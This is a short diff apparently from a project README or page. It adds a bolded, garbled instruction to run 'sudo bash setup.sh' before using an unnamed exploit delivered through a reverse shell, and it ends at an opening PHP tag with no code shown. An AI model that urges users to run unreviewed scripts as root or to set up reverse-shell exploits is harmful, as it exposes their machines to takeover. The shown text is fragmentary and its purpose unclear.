@@ -2,6 +2,11 @@
 <center>
 <img src="logo.jpg">
 </center>
+
+<b>
+First of all first run the setup command via command "sudo bash setup.sh" to get full experience and not kernel panic by exploit we use here in reverse shell to get it working like the all of the pieces fitts correctly on their places...
+</b>
+
 Just use php command following:
 
 <?php
